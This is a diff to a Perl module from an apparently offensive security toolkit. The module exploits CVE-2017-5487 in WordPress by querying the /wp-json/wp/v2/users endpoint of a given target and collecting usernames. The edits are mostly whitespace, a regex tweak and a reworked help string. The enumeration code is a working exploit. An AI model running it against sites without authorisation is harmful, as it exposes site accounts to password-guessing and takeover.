@@ -15,11 +15,11 @@ package Spellbook::Advisory::CVE_2017_5487 {
             "t|target=s" => \$target
         );
 
-        if ($target) {
-            if ($target !~ /^http(?:s)?:\/\//x) {
+        if ($target) {    
+            if ($target !~ /^http(s)?:\/\//x) { 
                 $target = "http://$target";
             }
-
+                    
             my $userAgent = Spellbook::Core::UserAgent -> new();
             my $request = $userAgent -> get("$target/wp-json/wp/v2/users");
 
@@ -29,11 +29,11 @@ package Spellbook::Advisory::CVE_2017_5487 {
 
                     foreach my $data (@$content) {
                         my $username = $data -> {slug};
-
+                        
                         if ($username) {
                             push @result, $username;
                         }
-                    }
+                    } 
                 };
 
                 return @result;
@@ -42,17 +42,14 @@ package Spellbook::Advisory::CVE_2017_5487 {
         }
 
         if ($help) {
-            return<<"EOT";
-
-Exploit::CVE_2017_5487
-=======================
--h, --help     See this menu
-r-t, --target   Define a target\n\n";
-
-EOT
+            return "
+                \rExploit::CVE_2017_5487
+                \r=======================
+                \r-h, --help     See this menu
+                \r-t, --target   Define a target\n\n";
         }
 
-        return 0;
+        return 0;   
     }
 }
 
